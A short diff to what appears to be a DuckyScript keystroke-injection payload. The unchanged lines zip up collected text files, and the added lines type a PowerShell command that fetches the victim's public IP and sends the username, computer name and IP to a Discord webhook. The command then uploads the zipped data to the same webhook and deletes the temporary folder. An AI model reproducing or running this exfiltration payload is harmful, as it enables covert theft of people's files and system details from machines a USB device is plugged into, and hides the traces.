@@ -97,5 +97,9 @@ DELAY 5000
 Compress collected data files into a ZIP archive
 STRING Start-Process -NoNewWindow powershell -Args "Compress-Archive -Path *.txt -DestinationPath .\collected_data.zip"
 ENTER
+DELAY 5000
+STRING $ip=curl -UseBasicParsing icanhazip.com|select Content|ft -AutoSize -Wrap -HideTableHeaders|Out-String;$url="https://discord.com/api/webhooks/WEBHOOKSTRINGHERE";$Body=@{ content = "System Overview by $env:USERNAME on $env:computername from $ip"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $url -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "f=@collected_data.zip" $url ; cd .. ; rmdir -Recurse temp
+ENTER
+DELAY 2500
 STRING exit
 ENTER
